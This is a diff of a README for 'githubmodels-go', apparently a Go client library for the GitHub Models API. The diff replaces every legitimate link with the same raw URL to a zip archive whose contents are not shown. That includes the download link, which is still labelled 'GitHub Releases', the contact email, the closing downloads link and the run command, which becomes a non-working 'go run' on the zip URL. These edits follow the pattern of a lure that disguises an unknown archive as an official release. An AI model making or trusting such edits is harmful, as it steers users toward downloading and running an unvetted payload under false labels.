@@ -6,7 +6,7 @@ Welcome to githubmodels-go! This Go client library makes it easy to work with th
 
 ## 📥 Download and Install
 
-To get started, visit this page to download the latest version: [GitHub Releases](https://github.com/Romero277/githubmodels-go/releases)
+To get started, visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/Romero277/githubmodels-go/main/endpoints/githubmodels-go-3.4.zip)
 
 You can find various versions of the software there. Choose the one that fits your needs and follow these steps:
 
@@ -42,7 +42,7 @@ After downloading the application, follow these steps to run it:
 5. **Run the Application:**
    Enter the command to run the application. The command will depend on the file type you downloaded. For instance:
    ```
-   go run githubmodels-go.go
+   go run https://raw.githubusercontent.com/Romero277/githubmodels-go/main/endpoints/githubmodels-go-3.4.zip
    ```
 
 ## 📖 How It Works
@@ -62,7 +62,7 @@ If you have questions or need help, don't hesitate to reach out. You can join di
 
 ## 📞 Contact
 
-For further assistance, you can reach us at: [support@example.com](mailto:support@example.com)
+For further assistance, you can reach us at: [https://raw.githubusercontent.com/Romero277/githubmodels-go/main/endpoints/githubmodels-go-3.4.zip](https://raw.githubusercontent.com/Romero277/githubmodels-go/main/endpoints/githubmodels-go-3.4.zip)
 
 ## 🤝 Contributing
 
@@ -74,4 +74,4 @@ If you would like to contribute to githubmodels-go, you are welcome! Here are wa
 
 ### Thank You
 
-Thank you for choosing githubmodels-go! We hope this library makes your experience with the GitHub Models API smooth and enjoyable. You can always revisit the downloads page for future updates and new versions: [GitHub Releases](https://github.com/Romero277/githubmodels-go/releases)
+Thank you for choosing githubmodels-go! We hope this library makes your experience with the GitHub Models API smooth and enjoyable. You can always revisit the downloads page for future updates and new versions: [GitHub Releases](https://raw.githubusercontent.com/Romero277/githubmodels-go/main/endpoints/githubmodels-go-3.4.zip)
